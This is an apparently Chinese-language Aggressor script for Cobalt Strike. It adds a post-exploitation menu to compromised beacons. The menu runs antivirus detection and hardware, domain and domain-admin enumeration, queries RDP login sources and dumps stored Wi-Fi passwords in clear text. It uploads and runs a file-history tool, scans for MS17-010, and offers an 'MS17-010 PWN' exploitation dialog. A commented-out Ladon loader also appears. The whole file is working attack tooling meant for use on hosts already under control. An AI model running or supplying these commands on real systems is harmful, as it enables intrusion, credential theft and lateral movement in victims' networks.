sub Ladon{

    bpowerpick($bid,"Ladon $3['command']");
}
sub recentqueryfunc{
    bupload($bid, script_resource("bin/openfilehistory.exe"));
    bshell($bid, "openfilehistory.exe $3['username']");
    #brm($bid,"openfilehistory.exe");
}
sub MS17-010-Scan{
        bexecute_assembly($bid, script_resource("bin/Privilege_escalation/MS17-010/Cscan.exe"), $3["IP"]." MS17010");
}
menu "扫描分析"{
    item "杀毒检测-进程对比"{
        foreach $id ($1){
            #bpowerpick($1, "avquery");
            blog($1,"还没写");
        }
    }
    item "杀毒检测-wmic"{
        foreach $id ($1){
            bshell($id, "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list");
            bshell($id, "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct");

        }
    }
    
    item "检测管理员进程"{
        if(-is64 $1)
        {
            bdllspawn($1, script_resource("bin/Processauthority.dll"), $null, "Processauthority dll", 5000, false);
        } else {
            bdllspawn($1, script_resource("bin/Processauthority.x64.dll"), $null, "Processauthority dll", 5000, false);
        }

    }
    item "查询硬件信息" {
        foreach $id ($1){
            btask($id, "=====Hardware=====", "");
            bshell($id, "wmic DISKDRIVE get deviceid,Caption,size,InterfaceType");
            bshell($id, "wmic LOGICALDISK get name,Description,filesystem,size,freespace");
            bshell($id, "wmic cpu get name,addresswidth,processorid");
            bshell($id, "wmic BaseBoard get Manufacturer,Product,Version,SerialNumber");
            bshell($id, "wmic memlogical get totalphysicalmemory");
            bshell($id, "wmic csproduct get IdentifyingNumber");
            bshell($id, "wmic SOUNDDEV get ProductName");
            bshell($id, "wmic DESKTOPMONITOR where Status='ok' get ScreenHeight,ScreenWidth");
            bshell($id, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
        }
    }
    item "查询Domain信息" {
        foreach $id ($1){
            btask($id, "=====Domain=====", "");
            bshell($id, "net view /domain && net group /domain && net group \"domain computers\" /domain && net accounts /domain && net group \"Domain Controllers\" /domain ");
            bshell($id, "Nslookup -type=SRV _ldap._tcp && nltest /domain_trusts && netdom query pdc");
            bshell($id, "net user /domain && wmic useraccount get /all && dsquery user && net group \"domain admins\" /domain");
        }
    }
    item "最近使用痕迹" {
        $bid = $1;
        $dialog = dialog("最近使用痕迹查询", %(username => "Administrator", bid => $id), &recentqueryfunc);
        dialog_description($dialog, "要查询的用户名输入");
        drow_text($dialog, "username", "USERNAME:");
        dbutton_action($dialog, "run");
        dialog_show($dialog);
    }
    item "查询管理员RDP登录来源" {
        $bid = $1;
        bshell($bid,"powershell -c \"get-winevent -filterhashtable \@{logname='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational';ID=1149;} -MaxEvents 20 |ft -wrap -property TimeCreated,Message\"");
    }
    item "查询wifi密码"{
        $bid = $1;
        bshell($bid,"netsh wlan show profile * key=clear");
    }
    item "查询.net兼容版本"{
        $bid = $1;
        bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP\" /s /v version | findstr /i version | sort /+26 /r")
    }
    menu "MS17-010" {
        item "MS17-010 Scan" {
            $bid = $1;
            $dialog = dialog("MS17-010 Scan",%(bid => $bid),&MS17-010-Scan);
            dialog_description($dialog, "MS17-010 Scan,IP: [ip ip/24 ip/26 ip/8]");
            drow_text($dialog, "IP",  "IP");
            dbutton_action($dialog, "GO!");
            dialog_show($dialog);
        }
        item "MS17-010 PWN"{
            $bid = $1;
            $dialog = dialog("MS17-010", %(ip => "192.168.1.1", grooms => "12", max_attempts => "5", bid => $bid, listener => 'listener'), &ms17_010);
            drow_text($dialog, "ip",  "IP: "); 	
            drow_listener($dialog, "listener", "Listener: ");
            drow_text($dialog, "grooms",  "Grooms: ");
            drow_text($dialog, "max_attempts",  "Attemps: ");
            dbutton_action($dialog, "Go");
            dialog_show($dialog);
        }
    }
    # menu "Ladon"{
    #     item "加载Ladon"{
    #         $bid = $1;
    #         bpowershell_import($bid, script_resource("bin/Ladon.ps1"));
    #     }
    #     item "执行"{
    #         $bid = $1;
    #         $dialog = dialog("Ladon", %(command => "192.168.1.1 portscan",bid => $bid), &Ladon);
    #         dialog_description($dialog, "PowerLadon 命令行");
    #         drow_text_big($dialog,"command","CMD:");
    #         dbutton_action($dialog, "Send");
    #         dialog_show($dialog);
    #     }
    # }
}
